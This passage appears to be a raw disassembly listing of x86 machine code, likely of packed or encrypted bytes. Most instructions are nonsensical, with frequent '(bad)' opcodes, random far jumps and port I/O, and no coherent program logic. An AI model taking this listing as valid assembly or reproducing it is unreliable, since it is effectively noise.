  4036d1:	rol    DWORD PTR [edx+0x48],1
  4036d4:	dec    esi
  4036d5:	ja     0x403747
  4036d7:	iret   
  4036d8:	add    al,bh
  4036da:	xor    dl,BYTE PTR [ebx-0x4565ef4]
  4036e0:	cmp    eax,0x578306c4
  4036e5:	stc    
  4036e6:	(bad)  
  4036e7:	mov    esp,0x27d23455
  4036ec:	(bad)  
  4036ed:	mov    eax,0x430f19ce
  4036f2:	cli    
  4036f3:	mov    edx,0x95e496f6
  4036f8:	cmp    dl,ah
  4036fa:	jbe    0x4036ef
  4036fc:	(bad)  
  4036fd:	ins    BYTE PTR es:[edi],dx
  4036fe:	arpl   di,si
  403700:	add    DWORD PTR [esi+0x513242dc],ecx
  403706:	dec    cx
  403708:	cwde   
  403709:	push   esi
  40370a:	jno    0x403714
  40370c:	call   0xf043:0x8080c39c
  403713:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403714:	sar    esp,0x67
  403717:	dec    esi
  403718:	ins    DWORD PTR es:[edi],dx
  403719:	fs dec esi
  40371b:	inc    edx
  40371c:	xor    eax,0x903133f3
  403721:	sbb    dl,BYTE PTR [ebp-0x7523cf6e]
  403727:	in     eax,0x69
  403729:	and    eax,0x1e690966
  40372e:	xchg   BYTE PTR [ebp+ebx*2+0x3a43e00f],bh
  403735:	cmp    al,0xc6
  403737:	or     al,ch
  403739:	mov    ah,0x56
  40373b:	cdq    
  40373c:	aad    0x34
  40373e:	fcom   QWORD PTR [esi-0x71]
  403741:	push   ds
  403742:	scas   al,BYTE PTR es:[edi]
  403743:	scas   eax,DWORD PTR es:[edi]
  403744:	pop    edi
  403745:	inc    esp
  403746:	fidivr WORD PTR [esi+esi*8+0x48]
  40374a:	dec    esi
  40374b:	mov    eax,ds:0x679acff3
  403750:	imul   ebp,edx,0xffffffad
  403753:	or     al,cl
  403755:	mov    dh,0x98
  403757:	fmul   QWORD PTR ds:0x885c737a
  40375d:	loope  0x4037d9
  40375f:	or     BYTE PTR [edx-0x3c],ah
  403762:	jmp    0xe329f2f8
  403767:	aaa    
  403768:	popf   
  403769:	neg    cl
  40376b:	les    edx,FWORD PTR [ebx+0x72]
  40376e:	mov    cs,eax
  403770:	stos   BYTE PTR es:[edi],al
  403771:	mov    dl,0x27
  403773:	and    BYTE PTR [ecx-0x44],ch
  403776:	xchg   esi,eax
  403777:	gs xchg ah,cl
  40377a:	inc    ebp
  40377b:	push   ecx
  40377c:	mov    ch,0xf5
  40377e:	dec    esp
  40377f:	jb     0x4037b7
  403781:	xor    al,0x19
  403783:	push   ds
  403784:	sub    al,0x64
  403786:	test   DWORD PTR [eax+0x18a6480f],0x79b83574
  403790:	and    edi,DWORD PTR [edx+ebp*4+0x61]
  403794:	cmp    DWORD PTR [edi-0x3a],ebx
  403797:	cwde   
  403798:	xlat   BYTE PTR ds:[ebx]
  403799:	jne    0x4037a0
  40379b:	je     0x4037d3
  40379d:	ds call 0x30ab:0x67c32fd8
  4037a5:	xchg   ebp,eax
  4037a6:	int3   
  4037a7:	(bad)  
  4037a8:	pmovmskb esp,mm4
  4037ab:	and    ecx,DWORD PTR [esp+edi*8-0x4f1e37ca]
  4037b2:	xchg   BYTE PTR [ebp+0x1dc79f7d],bl
  4037b8:	mov    edx,0x4e7b950c
  4037bd:	sar    esi,1
  4037bf:	stos   DWORD PTR es:[edi],eax
  4037c0:	mov    ebx,0x5f1f1c4e
  4037c5:	jae    0x40374b
  4037c7:	nop
  4037c8:	and    BYTE PTR [ebx],bh
  4037ca:	(bad)  
  4037cb:	ins    DWORD PTR es:[edi],dx
  4037cc:	push   edi
  4037cd:	cmp    eax,0x500e8444
  4037d2:	ficomp WORD PTR [ebx]
  4037d4:	inc    ecx
  4037d5:	stos   BYTE PTR es:[edi],al
  4037d6:	jo     0x403840
  4037d8:	mov    al,0x13
  4037da:	inc    eax
  4037db:	push   0x328c048e
  4037e0:	sbb    ebx,DWORD PTR [esi]
  4037e2:	jbe    0x4037a8
  4037e4:	mov    dl,0x85
  4037e6:	int    0x2b
  4037e8:	fwait
  4037e9:	(bad)  
  4037ea:	inc    ebp
  4037eb:	call   FWORD PTR [ecx-0x75f90d31]
  4037f1:	test   DWORD PTR [edi-0x44],0xee8a1592
  4037f8:	sub    al,BYTE PTR [eax+0x16d0eb1d]
  4037fe:	mov    ds:0x12d15708,al
  403803:	mov    dh,0xc0
  403805:	push   ebp
  403806:	cmp    esi,DWORD PTR ds:0x8f98d85c
  40380c:	(bad)  
  40380d:	fst    st(3)
  40380f:	push   edi
  403810:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403811:	mov    ch,0x4d
  403813:	out    dx,al
  403814:	js     0x403889
  403816:	jg     0x403800
  403818:	pop    esi
  403819:	push   es
  40381a:	pop    ebp
  40381b:	pop    ss
  40381c:	pop    ss
  40381d:	pusha  
  40381e:	sbb    eax,DWORD PTR [eax+ecx*8-0x60]
  403822:	outs   dx,DWORD PTR ds:[esi]
  403823:	xchg   BYTE PTR [ebp+0x661e0e54],cl
  403829:	mov    ebx,0x9ee8c61b
  40382e:	les    ebp,FWORD PTR ds:0x288cb51c
  403834:	jl     0x40389f
  403836:	lock xor ch,BYTE PTR gs:[eax]
  40383a:	shl    BYTE PTR [ebp-0x67bb13e5],0x44
  403841:	enter  0xe167,0x94
  403845:	xchg   esi,eax
  403846:	jl     0x403881
  403848:	(bad)  
  403849:	aas    
  40384a:	and    al,0xf6
  40384c:	sub    ebp,DWORD PTR [ebp+0x6a]
  40384f:	push   cs
  403850:	daa    
  403851:	mov    esi,0xa0fef106
  403856:	jnp    0x40385d
  403858:	dec    edi
  403859:	jp     0x40388e
  40385b:	jmp    0xfede39b0
  403860:	push   esi
  403861:	mov    esi,DWORD PTR [edi-0x41]
  403864:	fs mov bl,0x35
  403867:	clc    
  403868:	or     edi,DWORD PTR [ebx+0x1d]
  40386b:	out    0x97,al
  40386d:	out    0xab,al
  40386f:	ins    BYTE PTR es:[edi],dx
  403870:	ficom  WORD PTR [edx+0x23a3a75b]
  403876:	mov    bl,0xef
  403878:	or     cl,BYTE PTR [ebx]
  40387a:	into   
  40387b:	icebp  
  40387c:	in     eax,0xa1
  40387e:	inc    edx
  40387f:	sbb    eax,0xd564b6e3
  403884:	(bad)  
  403885:	ja     0x4038eb
  403887:	shl    BYTE PTR [ecx-0xe],1
  40388a:	pop    ebp
  40388b:	ins    DWORD PTR es:[edi],dx
  40388c:	pop    es
  40388d:	and    eax,0x146f3c6b
  403892:	sbb    al,0x6a
  403894:	les    eax,FWORD PTR [esi]
  403896:	jb     0x403887
  403898:	scas   eax,DWORD PTR es:[edi]
  403899:	sub    eax,0xf49bb71
  40389e:	data16 rol ah,0xe8
  4038a2:	add    ebx,edi
  4038a4:	add    DWORD PTR [ebx+0x1c2a4075],eax
  4038aa:	sbb    cl,BYTE PTR [ebp+0x5f]
  4038ad:	retf   
  4038ae:	inc    esi
  4038af:	sbb    al,0x80
  4038b1:	ja     0x4038c5
  4038b3:	cdq    
  4038b4:	les    eax,FWORD PTR [eax]
  4038b6:	addr16 add edx,0x42
  4038ba:	push   es
  4038bb:	sbb    eax,0xffeaf1a4
  4038c0:	jmp    0x4038a1
  4038c2:	iret   
  4038c3:	push   ecx
  4038c4:	and    BYTE PTR [eax],0xc2
  4038c7:	push   ss
  4038c8:	call   0xc2abc570
  4038cd:	outs   dx,BYTE PTR ds:[esi]
  4038ce:	mov    bl,0x79
  4038d0:	aas    
  4038d1:	pop    edi
  4038d2:	inc    ebx
  4038d3:	and    al,0x44
  4038d5:	cs mov dl,0x4d
  4038d8:	pop    ecx
  4038d9:	mov    DWORD PTR [ebp-0x7984f94d],eax
  4038df:	jnp    0x40392d
  4038e1:	pop    ss
  4038e2:	inc    esp
  4038e3:	(bad)  
  4038e4:	dec    eax
  4038e5:	pop    eax
  4038e6:	mov    eax,0x30fca1e6
  4038eb:	mov    ah,0x9a
  4038ed:	pop    DWORD PTR [edi]
  4038ef:	daa    
  4038f0:	xlat   BYTE PTR ds:[ebx]
  4038f1:	pop    ss
  4038f2:	test   eax,0x65bd8238
  4038f7:	or     bh,BYTE PTR [eax-0x2fd76926]
  4038fd:	std    
  4038fe:	push   0xffffff87
  403900:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403901:	and    eax,eax
  403903:	dec    ebx
  403904:	xchg   ecx,eax
  403905:	add    ah,BYTE PTR [ebx+0xeaa89a9]
  40390b:	icebp  
  40390c:	stos   DWORD PTR es:[edi],eax
  40390d:	push   esp
  40390e:	das    
  40390f:	xchg   edi,eax
  403910:	add    eax,0x1388b33e
  403915:	xchg   ecx,eax
  403916:	cmp    BYTE PTR [esi-0x12],dl
  403919:	dec    ecx
  40391a:	pop    edi
  40391b:	dec    ebp
  40391c:	jle    0x403954
  40391e:	pushf  
  40391f:	and    DWORD PTR [esi],esi
  403921:	sub    eax,0x84508237
  403926:	stos   DWORD PTR es:[edi],eax
  403927:	mov    bh,0x9d
  403929:	and    edx,DWORD PTR ds:0x5cd94242
  40392f:	or     cl,ah
  403931:	ret    0x9556
  403934:	mov    bl,BYTE PTR [edx+0x43]
  403937:	mov    edx,0x3737e0c5
  40393c:	out    dx,al
  40393d:	jb     0x403945
  40393f:	pusha  
  403940:	jno    0x40399a
  403942:	rcr    BYTE PTR [esp+ebp*1],cl
  403945:	jmp    0x1312:0xc631e665
  40394c:	push   cs
  40394d:	les    eax,FWORD PTR [edi+0x65fe69fe]
  403953:	fisttp WORD PTR [eax-0x28]
  403956:	popa   
  403957:	mov    bh,0x2b
  403959:	sbb    BYTE PTR [ebp-0x2cfabf94],0xc4
  403960:	out    dx,al
  403961:	pop    ebx
  403962:	cld    
  403963:	dec    esi
  403964:	inc    ecx
  403965:	push   edx
  403966:	cwde   
  403967:	push   edi
  403968:	add    al,BYTE PTR [ecx+0x6ccbea35]
  40396e:	pop    ds
  40396f:	jl     0x40399c
  403971:	ret    0x933d
  403974:	push   ebx
  403975:	add    ch,BYTE PTR [ecx+0x4ce601ad]
  40397b:	das    
  40397c:	xchg   esi,eax
  40397d:	loop   0x4039fa
  40397f:	sbb    ch,BYTE PTR [ecx]
  403981:	xchg   ecx,eax
  403982:	xchg   esi,eax
  403983:	test   bl,0x7
  403986:	add    ch,BYTE PTR [edi+ebx*8+0x9]
  40398a:	in     eax,dx
  40398b:	(bad)  
  40398c:	pop    ds
  40398d:	dec    ebx
  40398e:	int    0xae
  403990:	into   
  403991:	pop    ecx
  403992:	mov    bh,0x1e
  403994:	mov    esp,0x22ffc4d
  403999:	int3   
  40399a:	shl    bh,cl
  40399c:	and    eax,0xdb239ffa
  4039a1:	adc    DWORD PTR [edx+0x16],0x468476fe
  4039a8:	popa   
  4039a9:	inc    edx
  4039aa:	icebp  
  4039ab:	xchg   edx,eax
  4039ac:	je     0x4039d4
  4039ae:	pop    ecx
  4039af:	push   cs
  4039b0:	dec    ecx
  4039b1:	mov    ecx,0x90232aae
  4039b6:	imul   ebx,ecx,0x0
  4039b9:	mov    BYTE PTR [ebp+ebx*2+0x29b5fdfc],ah
  4039c0:	xchg   edi,eax
  4039c1:	mov    fs,WORD PTR [ecx-0x5998ef5c]
  4039c7:	ds add eax,0x7d35ff95
  4039cd:	shr    BYTE PTR [edi+eiz*2],0x22
  4039d1:	call   0x426c877
  4039d6:	fcom   st(0)
  4039d8:	jmp    0x8f1b:0x30cdd241
  4039df:	pop    ebp
  4039e0:	clc    
  4039e1:	and    DWORD PTR [ebx+esi*2],0xb45dfadf
  4039e8:	lock cmp DWORD PTR [esi+edx*8],0xffffffed
  4039ed:	test   BYTE PTR [edi+0x1f],ch
  4039f0:	push   ecx
  4039f1:	inc    eax
  4039f2:	pop    ss
  4039f3:	push   0x5c3e3ea5
  4039f8:	dec    ebx
  4039f9:	and    DWORD PTR [edx-0xe],esp
  4039fc:	shl    BYTE PTR [ecx],cl
  4039fe:	ins    BYTE PTR es:[edi],dx
  4039ff:	dec    ecx
  403a00:	cmp    cl,BYTE PTR [edx-0x30]
  403a03:	(bad)  [ecx]
  403a05:	push   esi
  403a06:	fs lock push ds
  403a09:	push   edi
  403a0a:	cld    
  403a0b:	push   0xffffff8e
  403a0d:	or     DWORD PTR [ebx-0x29],0xffffff89
  403a11:	das    
  403a12:	xor    dl,ch
  403a14:	ror    edx,0x4e
  403a17:	push   esp
  403a18:	inc    esp
  403a19:	fwait
  403a1a:	std    
  403a1b:	jne    0x403a56
  403a1d:	xor    al,0x22
  403a1f:	sbb    eax,0x76e18a8e
  403a24:	cmp    ah,BYTE PTR [ebp+0x192a402]
  403a2a:	pop    ecx
  403a2b:	xor    eax,0x54652707
  403a30:	call   0x8cb345aa
  403a35:	mov    eax,0xd511fcb0
  403a3a:	sahf   
  403a3b:	xor    al,0xd9
  403a3d:	adc    esp,DWORD PTR [ebx+esi*1-0x10743d69]
  403a44:	push   eax
  403a45:	push   ebp
  403a46:	aad    0x4
  403a48:	cmp    dl,dh
  403a4a:	into   
  403a4b:	sbb    dh,cl
  403a4d:	cli    
  403a4e:	gs push ecx
  403a50:	fsubr  QWORD PTR [edx]
  403a52:	aam    0x48
  403a54:	call   0x5da4de19
  403a59:	inc    ecx
  403a5a:	test   eax,0x8614a411
  403a5f:	ret    0x7905
  403a62:	push   ecx
  403a63:	mov    ds:0x3b5607c5,al
  403a68:	push   ebx
  403a69:	in     al,0x69
  403a6b:	ins    DWORD PTR es:[edi],dx
  403a6c:	push   ds
  403a6d:	sahf   
  403a6e:	sbb    al,0x13
  403a70:	dec    esp
  403a71:	fbstp  TBYTE PTR [ebx+0x32]
  403a74:	or     eax,0x96db232c
  403a79:	test   al,0x87
  403a7b:	lock xor eax,0xb87c3270
  403a81:	fstp   TBYTE PTR [ecx]
  403a83:	shl    bh,0xf4
  403a86:	leave  
  403a87:	clc    
  403a88:	sbb    edx,DWORD PTR ds:0x2ce175c7
  403a8e:	mov    ebp,0xde401af3
  403a93:	gs aaa 
  403a95:	lods   eax,DWORD PTR ds:[esi]
  403a96:	mov    gs,WORD PTR [ebp-0x75]
  403a99:	leave  
  403a9a:	push   esi
  403a9b:	jnp    0x403a5f
  403a9d:	test   al,0x40
  403a9f:	pop    esp
  403aa0:	mov    eax,0x1c287dbb
  403aa5:	rcr    esi,0xf9
  403aa8:	retf   0x4fc7
  403aab:	cld    
  403aac:	ins    BYTE PTR es:[edi],dx
  403aad:	mov    al,0x26
  403aaf:	xor    DWORD PTR [esi-0x1e888aaf],edi
  403ab5:	xchg   ebx,eax
  403ab6:	adc    al,0xe8
  403ab8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403ab9:	fistp  WORD PTR [ecx-0x46e0ddd0]
  403abf:	push   ds
  403ac0:	cmp    eax,0xf378c764
  403ac5:	push   eax
  403ac6:	int3   
  403ac7:	push   esi
  403ac8:	adc    BYTE PTR [ecx+0x7f],dl
  403acb:	sahf   
  403acc:	or     DWORD PTR [edx+0x66d49368],ecx
  403ad2:	(bad)  
  403ad4:	(bad)  
  403ad5:	mov    eax,ds:0x4d0da540
  403ada:	or     esi,DWORD PTR [edi-0x192de44d]
  403ae0:	arpl   WORD PTR ds:0x9dc48da9,dx
  403ae6:	pop    ecx
  403ae7:	(bad)  
  403ae8:	imul   esi
  403aea:	mov    esp,0x292ecf21
  403aef:	xchg   BYTE PTR [edx+0x370592fb],bh
  403af5:	arpl   ax,si
  403af7:	xchg   DWORD PTR [ebx],eax
  403af9:	and    cl,BYTE PTR [ebx+0x3a45537b]
  403aff:	daa    
  403b00:	int3   
  403b01:	mov    eax,DWORD PTR ds:0xaca808bc
  403b07:	je     0x403ab5
  403b09:	xchg   DWORD PTR [esi-0xfc0d22c],esi
  403b0f:	in     al,dx
  403b10:	dec    ebp
  403b11:	in     eax,dx
  403b12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403b13:	push   eax
  403b14:	xor    eax,0xdd3315d1
  403b19:	mov    DWORD PTR [ecx],ecx
  403b1b:	mov    ds:0x5f4ae15c,eax
  403b20:	mov    cs,WORD PTR [edi+0x4459e137]
  403b26:	cmp    al,0xa9
  403b28:	push   esi
  403b29:	xor    edi,esp
  403b2b:	mov    bh,0xd4
  403b2d:	xor    ch,BYTE PTR [ebx-0x43]
  403b30:	gs aaa 
  403b32:	fs je  0x403ae7
  403b35:	pop    eax
  403b36:	pop    ebx
  403b37:	jmp    0xb1cf:0xcfbeccf8
  403b3e:	bnd ret 
  403b40:	out    dx,al
  403b41:	mov    edi,0xe151cefa
  403b46:	and    al,BYTE PTR [ecx]
  403b48:	in     al,0x0
  403b4a:	cmp    ecx,ecx
  403b4c:	int    0xd5
  403b4e:	sub    BYTE PTR [edi+edi*1],0x1f
  403b52:	sbb    eax,0xf0bef894
  403b57:	rcr    DWORD PTR [ebp-0x22],1
  403b5a:	jp     0x403af9
  403b5c:	scas   eax,DWORD PTR es:[edi]
  403b5d:	adc    DWORD PTR [eax+0x342b976a],ecx
  403b63:	les    ebx,FWORD PTR [ebp+0x71]
  403b66:	loop   0x403b13
  403b68:	or     bh,ch
  403b6a:	pop    ss
  403b6b:	mov    DWORD PTR [esi+0x56e99da4],esp
  403b71:	jae    0x403b37
  403b73:	gs dec esi
  403b75:	mov    ah,bl
  403b77:	idiv   DWORD PTR ds:0x50fb578e
  403b7d:	(bad)  
  403b7f:	bound  ecx,QWORD PTR [esi+eiz*4+0x18]
  403b83:	inc    eax
  403b84:	mov    esp,0x5eece7f6
  403b89:	jle    0x403bf9
  403b8b:	jmp    0x9f77:0x17f8955c
  403b92:	add    edi,DWORD PTR ds:0x8b3a6448
  403b98:	push   cs
  403b99:	pushf  
  403b9a:	mov    ds:0x7287c2af,eax
  403b9f:	in     al,dx
  403ba0:	ret    
  403ba1:	mov    esi,0x1bbe18af
  403ba6:	or     ebp,DWORD PTR [ecx+0x78]
  403ba9:	jo     0x403bcf
  403bab:	int3   
  403bac:	xchg   edi,eax
  403bad:	jg     0x403c2d
  403baf:	cmp    dl,cl
  403bb1:	adc    al,0xd1
  403bb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403bb4:	add    DWORD PTR ds:[esi-0x1aa67ee],ecx
  403bbb:	int3   
  403bbc:	or     esp,edx
  403bbe:	shl    BYTE PTR [eax+0x37],0xee
  403bc2:	nop
  403bc3:	mov    ebp,0xeb1e3b4b
  403bc8:	mov    cl,0xb
  403bca:	test   al,0x69
  403bcc:	sub    al,0x8c
  403bce:	clc    
  403bcf:	jge    0x403c22
  403bd1:	xor    al,0xb8
  403bd3:	les    esp,FWORD PTR [edi-0x18b9ff71]
  403bd9:	out    dx,al
  403bda:	or     ah,BYTE PTR ds:0xecc55e94
  403be0:	adc    eax,0x418e7a26
  403be5:	out    0x27,al
  403be7:	ret    
  403be8:	fwait
  403be9:	call   0x9ebc4675
  403bee:	adc    cl,bh
  403bf0:	mov    ds:0x33a1a392,al
  403bf5:	mov    bh,0x4d
  403bf7:	xor    ch,BYTE PTR [ecx+0x57]
  403bfa:	push   ss
  403bfb:	inc    ecx
  403bfc:	scas   eax,DWORD PTR es:[edi]
  403bfd:	push   es
  403bfe:	test   DWORD PTR [eax+0xc],esp
  403c01:	arpl   bp,di
  403c03:	test   cl,cl
  403c05:	cmc    
  403c06:	js     0x403c70
  403c08:	pop    esi
  403c09:	add    BYTE PTR [ecx],ah
  403c0b:	push   eax
  403c0c:	lahf   
  403c0d:	xchg   DWORD PTR [edi-0xd],esi
  403c10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403c11:	mov    al,0x9
  403c13:	mov    WORD PTR [edi],gs
  403c15:	out    0x17,eax
  403c17:	mov    DWORD PTR [edx],ebx
  403c19:	(bad)  ds:0x9eeed671
  403c1f:	popf   
  403c20:	xchg   esi,eax
  403c21:	(bad)  
  403c22:	sbb    edx,ebx
  403c24:	mov    ebx,eax
  403c26:	jecxz  0x403c80
  403c28:	shr    BYTE PTR [ebp-0x4dd929eb],1
  403c2e:	pop    ecx
  403c2f:	mov    ecx,0x11aba2a
  403c34:	jmp    0x575b2575
  403c39:	or     eax,0x71e1d78a
  403c3e:	(bad)  
  403c3f:	ins    BYTE PTR es:[edi],dx
  403c40:	aas    
  403c41:	push   esp
  403c42:	jno    0x403c41
  403c44:	je     0x403bd0
  403c46:	bnd fs jns 0x403cb5
  403c4a:	adc    eax,0x958b9108
  403c4f:	dec    edi
  403c50:	cdq    
  403c51:	xor    cl,BYTE PTR [edx+0x3a]
  403c54:	mov    bh,dh
  403c56:	adc    al,0xe8
  403c58:	icebp  
  403c59:	or     eax,0xa163e14f
  403c5e:	call   0xd06edf02
  403c63:	ror    BYTE PTR ss:[edx-0x35],cl
  403c67:	xor    cl,BYTE PTR [ebp+esi*4+0x28]
  403c6b:	adc    eax,0xfa63469e
  403c70:	push   ebp
  403c71:	aas    
  403c72:	out    dx,eax
  403c73:	je     0x403c76
  403c75:	or     al,al
  403c77:	xchg   ebp,eax
  403c78:	sbb    WORD PTR [edi-0x37],dx
  403c7c:	xchg   DWORD PTR [edx+0x7a],esi
  403c7f:	inc    ebp
  403c80:	stos   BYTE PTR es:[edi],al
  403c81:	add    ebp,DWORD PTR [ebp+0x5b]
  403c84:	jmp    0x4b2123fd
  403c89:	sbb    al,0xed
  403c8b:	sub    eax,0x836163f7
  403c90:	loopne 0x403cf5
  403c92:	sbb    BYTE PTR [ebp-0x117b8b8e],0xd7
  403c99:	pushf  
  403c9a:	mov    DWORD PTR [edx*8+0x67494802],0x4ce2c621
  403ca5:	mov    al,0x4e
  403ca7:	xchg   ebx,eax
  403ca8:	jae    0x403d0e
  403caa:	mov    ah,0x87
  403cac:	cdq    
  403cad:	and    BYTE PTR [ecx-0x4],bl
  403cb0:	jl     0x403cdd
  403cb2:	leave  
  403cb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403cb4:	mov    esi,0xc7534458
  403cb9:	xchg   esi,eax
  403cba:	in     eax,0x40
  403cbc:	push   cs
  403cbd:	in     al,0x80
  403cbf:	dec    edi
  403cc0:	mov    dh,0xa4
  403cc2:	mov    dh,BYTE PTR [edi]
  403cc4:	popf   
  403cc5:	cvtps2pd xmm3,xmm4
  403cc8:	in     al,dx
  403cc9:	mov    WORD PTR [edi],ss
  403ccb:	dec    esi
  403ccc:	push   eax
  403ccd:	lods   eax,DWORD PTR ds:[esi]
  403cce:	mov    DWORD PTR [ecx],eax
  403cd0:	mov    dh,0x5c
  403cd2:	jmp    0x3177d4dc
  403cd7:	pop    edi
  403cd8:	sbb    esi,esi
  403cda:	mov    gs,edx
  403cdc:	sub    esi,edx
  403cde:	leave  
  403cdf:	cmp    cl,BYTE PTR ds:0x9affeb5b
  403ce5:	shl    BYTE PTR [ebx-0x42],0x3c
  403ce9:	push   es
  403cea:	xchg   ecx,eax
  403ceb:	repz pop eax
  403ced:	jbe    0x403d55
  403cef:	dec    edx
  403cf0:	lahf   
  403cf1:	inc    ecx
  403cf2:	sbb    ah,bl
  403cf4:	daa    
  403cf5:	push   0xffffff92
  403cf7:	shr    BYTE PTR ds:0x30828f3e,cl
  403cfd:	out    dx,eax
  403cfe:	fidivr WORD PTR [ebx+0x77]
  403d01:	scas   eax,DWORD PTR es:[edi]
  403d02:	or     ebp,esp
  403d04:	cmp    al,0x23
  403d06:	jo     0x403d7a
  403d08:	repnz mov ds:0xca795eaf,eax
  403d0e:	inc    eax
  403d0f:	sub    ebp,DWORD PTR [eax-0x12]
  403d12:	xchg   ecx,eax
  403d13:	or     cl,bh
  403d15:	mov    BYTE PTR ds:0x39de813e,dh
  403d1b:	retf   0xa3f6
  403d1e:	push   0xc84722d4
  403d23:	ficomp WORD PTR [edi]
  403d25:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403d26:	std    
  403d27:	mov    cl,al
  403d29:	mov    bl,BYTE PTR [eax-0x1f62da12]
  403d2f:	cmp    ch,cl
  403d31:	ins    BYTE PTR es:[edi],dx
  403d32:	cdq    
  403d33:	mov    ah,0xdf
  403d35:	retf   
  403d36:	xor    al,0xb1
  403d38:	push   ebx
  403d39:	lahf   
  403d3a:	test   BYTE PTR [edi],ch
  403d3c:	inc    edx
  403d3d:	fadd   QWORD PTR [esp-0x3b]
  403d41:	bound  esp,QWORD PTR [edx+ecx*4+0x3594f811]
  403d48:	rcl    DWORD PTR [esi+0x272bb684],1
  403d4e:	ret    0xf3c1
  403d51:	fcom   DWORD PTR [edi-0x3e]
  403d54:	test   DWORD PTR [esi+eax*8-0x21831d0e],ecx
  403d5b:	xlat   BYTE PTR ds:[ebx]
  403d5c:	inc    edx
  403d5d:	jp     0x403d0e
  403d5f:	inc    ecx
  403d60:	idiv   DWORD PTR [edi+0x74]
  403d63:	push   ecx
  403d64:	mov    BYTE PTR [edx+0x4c],dl
  403d67:	xchg   edi,eax
  403d68:	pusha  
  403d69:	mov    ecx,0x37b3ad84
  403d6e:	sar    BYTE PTR [esi+ebp*8+0x1bdc3da0],1
  403d75:	jmp    0xa51d:0xb3879b07
  403d7c:	imul   ebp,DWORD PTR [esi+0x2],0x5a9028ff
  403d83:	inc    ebp
  403d84:	inc    esp
  403d85:	add    BYTE PTR [ebp-0x73],cl
  403d88:	and    edx,ecx
  403d8a:	in     eax,dx
  403d8b:	aaa    
  403d8c:	cmp    esp,ebx
  403d8e:	and    esp,DWORD PTR [edx+0x6211af83]
  403d94:	(bad)  
  403d95:	jno    0x403d18
  403d97:	lahf   
  403d98:	test   DWORD PTR [ebx],edx
  403d9a:	xor    bl,al
  403d9c:	pop    edx
  403d9d:	sti    
  403d9e:	push   ds
  403d9f:	cmc    
  403da0:	repz mov bl,0xd9
  403da3:	pushf  
  403da4:	pop    ss
  403da5:	sar    BYTE PTR [ecx-0x16b7be7],cl
  403dab:	mov    gs,WORD PTR [ebp-0x70]
  403dae:	(bad)  
  403daf:	not    DWORD PTR [edi+0x5d3369b0]
  403db5:	jne    0x403dfb
  403db7:	in     eax,0xb8
  403db9:	pop    ds
  403dba:	pop    ss
  403dbb:	fidiv  DWORD PTR [ebx-0x2e740e45]
  403dc1:	idiv   DWORD PTR [edx-0xf49743d]
  403dc7:	cli    
  403dc8:	jge    0x403dfc
  403dca:	mov    edx,0x20f8f05e
  403dcf:	test   al,0x26
  403dd1:	xchg   ebp,eax
  403dd2:	mov    eax,0xd8eb803f
  403dd7:	and    esi,DWORD PTR [ebx+eiz*1]
  403dda:	test   al,0xdb
  403ddc:	leave  
  403ddd:	scas   al,BYTE PTR es:[edi]
  403dde:	sbb    al,0x7e
  403de0:	xchg   BYTE PTR [edx+edi*8-0x3d],ah
  403de4:	fwait
  403de5:	xchg   ebp,eax
  403de6:	fistp  DWORD PTR [ecx-0x25]
  403de9:	or     edi,DWORD PTR [eax+0x35]
  403dec:	fisubr DWORD PTR [ecx+0x5f2b2e47]
  403df2:	cmc    
  403df3:	and    DWORD PTR [ecx+0x71],ebx
  403df6:	xor    DWORD PTR ds:[edx+ecx*2-0x4a07bc3a],0x50
  403dff:	mov    bl,dh
  403e01:	mov    gs,ebp
  403e03:	mov    edi,DWORD PTR [edi+0x53b95adc]
  403e09:	xlat   BYTE PTR ds:[ebx]
  403e0a:	push   0x6c
  403e0c:	daa    
  403e0d:	pop    esp
  403e0e:	fstp   DWORD PTR [eax]
  403e10:	iret   
  403e11:	jnp    0x403e57
  403e13:	inc    ecx
  403e14:	push   edi
  403e15:	ret    0x7b38
  403e18:	rcl    ch,cl
  403e1a:	data16 (bad) 
  403e1c:	or     DWORD PTR [ebp+0x3b3bcd65],edx
  403e22:	sti    
  403e23:	outs   dx,DWORD PTR ds:[esi]
  403e24:	int    0x8c
  403e26:	cmp    al,0x4a
  403e28:	adc    DWORD PTR [eax],esp
  403e2a:	mov    cl,0x95
  403e2c:	mov    eax,0x6c1b6806
  403e31:	(bad)  
  403e32:	and    BYTE PTR [ecx+eax*4+0x2a],ch
  403e36:	rcl    DWORD PTR [eax+0x26e27e47],0x2c
  403e3d:	ja     0x403e58
  403e3f:	dec    ecx
  403e40:	lods   al,BYTE PTR ds:[esi]
  403e41:	cmp    eax,0x724c0425
  403e46:	loopne 0x403e26
  403e48:	mov    gs,WORD PTR [edx+0xf978d68]
  403e4e:	call   0xe185bf5f
  403e53:	out    0x4c,eax
  403e55:	sbb    DWORD PTR [edi+0x2],ebx
  403e58:	dec    edi
  403e59:	push   ebx
  403e5a:	adc    DWORD PTR [edi+0x50],ecx
  403e5d:	loopne 0x403e7b
  403e5f:	test   eax,0xfa860d91
  403e64:	rcl    cl,1
  403e66:	jmp    0x6b87:0xf99b09e3
  403e6d:	mov    esp,?
  403e6f:	jg     0x403e97
  403e71:	sbb    ch,al
  403e73:	jae    0x403e6a
  403e75:	inc    ecx
  403e76:	aam    0xe3
  403e78:	fcom   st(5)
  403e7a:	add    DWORD PTR [edx+0x3fb54dd9],0x4c
  403e81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403e82:	push   ss
  403e83:	push   esp
  403e84:	stc    
  403e85:	repnz (bad) 
  403e87:	xor    esp,edi
  403e89:	(bad)  
  403e8a:	lock push ebx
  403e8c:	jae    0x403ec2
  403e8e:	aaa    
  403e8f:	cmp    dh,0x5d
  403e92:	loopne 0x403e62
  403e94:	mov    dh,0x3a
  403e96:	push   ecx
  403e97:	dec    ebx
  403e98:	mov    eax,ds:0xfe7a9be9
  403e9d:	leave  
  403e9e:	fstp   DWORD PTR es:[ebx+eiz*4+0x27]
  403ea3:	pusha  
  403ea4:	push   ebx
  403ea5:	sub    bh,BYTE PTR [esi]
  403ea7:	(bad)  
  403ea8:	lods   eax,DWORD PTR ds:[esi]
  403ea9:	jb     0x403ee3
